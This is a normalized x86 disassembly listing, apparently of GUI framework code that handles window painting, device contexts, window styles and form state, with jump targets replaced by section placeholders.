mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_442a08
mov bx 0xfff2
call sub_44c24c
test al al
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_442a74
jmp r-xdata
sub_41d63c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x50 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_42cd20
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_41d67c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x44 ] 0x8
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42c280
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x250 ] eax
mov al [ r-xdata ]
mov edx [ ebp - 0x4 ]
or al [ edx + 0x88 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x88 ] al
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_41d6cc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x44 ] 0x8
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42c2d4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x254 ] eax
mov al [ r-xdata ]
mov edx [ ebp - 0x4 ]
or al [ edx + 0x88 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x88 ] al
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_41d71c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x2cc ] 0x1
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_42c838
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x47 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2cc ] 0xfd
jmp r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2cc ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41eb2c
pop ecx
pop ecx
pop ebp
retn
sub_41d77c
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d7e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d7eb
lea eax [ ebp - 0x8 ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
sub_41d80c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42c7cc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_430f60
mov eax [ ebp - 0x4 ]
call sub_431158
sub_41d85c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4427fc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_41d8ac
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0x46
jg r-xdata
sub eax 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x20 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add eax 0xfffffffa
sub eax 0x3
jb r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_431488
mov eax [ ebp - 0x4 ]
mov bx 0xffb6
call sub_44c24c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x218 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffb4
call sub_44c24c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x218 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x213 ] 0x2
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
cmp [ eax ] 0x1
jne r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x211 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
cmp [ eax ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x2
jne r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
xor ecx ecx
call sub_40adb0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e154
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f50c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41db5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x28 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41db3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x28 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x18 ]
call sub_40fcf0
mov eax [ rw-data ]
mov edx [ eax + 0x7c ]
mov eax [ ebp - 0x18 ]
call sub_40fae8
mov eax [ ebp - 0x28 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_40c824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41db46
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_40fcf0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x28 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov eax [ ebp - 0x2c ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
xor ecx ecx
call sub_40adb0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e154
call sub_434714
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41dc9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f50c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41dc76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41dc59
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
call sub_40fcf0
mov eax [ rw-data ]
mov edx [ eax + 0x7c ]
mov eax [ ebp - 0x18 ]
call sub_40fae8
mov eax [ ebp - 0x2c ]
add eax 0x10
push eax
mov eax [ ebp - 0x2c ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_408e44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc60
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_40fcf0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
mov eax [ ebp - 0xc ]
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_434714
mov [ ebp - 0xc ] eax
sub_41dc7d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ReleaseDC
retn
sub_41dcbc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_41dd08
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e1a4
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x1 ] 0x0
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_41e20c
cmp [ eax + 0x213 ] 0x2
jne r-xdata
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn
sub_41dd5c
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0x14
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x130 ]
call sub_40f3c0
push eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
sub eax 0x2b
je r-xdata
mov esp ebp
pop ebp
retn
push ebp
call sub_41dcbc
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e1a4
test eax eax
je r-xdata
push ebp
call sub_41dcbc
pop ecx
push ebp
call sub_41dcbc
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_41dd08
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419f98
jmp r-xdata
sub_41de24
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b86c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
push 0x14
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0xc ]
sub eax [ edx + 0x4 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
sub eax [ edx ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
push eax
call SetWindowPos
sub_41de8c
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c0f4
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_442a48
dec eax
test eax eax
jl r-xdata
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_430918
mov eax [ ebp - 0xc ]
push eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetWindowLongA
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_442a08
call sub_40bbc8
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_442a08
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
sub_41df40
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22c ] 0x0
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22c ] 0x1
xor eax eax
push ebp
push sub_41dfc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22c ] 0x0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov dl [ eax + 0x4f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ rw-data ]
mov dl [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_41dfd4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x210 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x210 ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_430fcc
sub_41e010
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x211 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x211 ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x211 ]
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_430fcc
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ba44
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
sub_41e06c
push ebp
mov ebp esp
add esp 0xffffffe0
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x20 ]
mov ecx 0x4
[ edi ] [ esi ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42bfe4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x90 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_430fcc
sub_41e0dc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x90 ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42c128
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x211 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x0
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x268 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x211 ] al
jmp r-xdata
sub_41e154
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
push eax
call SendMessageA
call sub_428e90
mov [ ebp - 0x8 ] eax
sub_41e1a4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4227ec
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
inc [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4227c8
cmp [ eax + 0x217 ] 0x1
jne r-xdata
sub_41e20c
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4227ec
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4227c8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_41e284
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_43c264
mov [ ebp - 0x1 ] 0x1
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn 0x10
sub_41e2cc
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
call sub_422790
dec eax
test eax eax
jl r-xdata
mov eax [ rw-data ]
call sub_422790
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
push eax
mov eax sub_41e284
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ rw-data ]
call sub_422790
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx [ ebp - 0x10 ]
call sub_43c464
call sub_44c070
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
sub_41e40c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41e430
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4e ]
xor al 0x1
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_41e44c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e430
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
call sub_416770
test eax eax
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_41e484
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x217 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp - 0x5 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x217 ]
mov [ ebp - 0x6 ] al
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x217 ] al
cmp [ ebp - 0x5 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_430f60
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41e8fc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x138 ] 0x0
jne r-xdata
cmp [ ebp - 0x6 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e9d8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42cc88
cmp [ ebp - 0x5 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_431158
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41d71c
sub_41e538
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x2
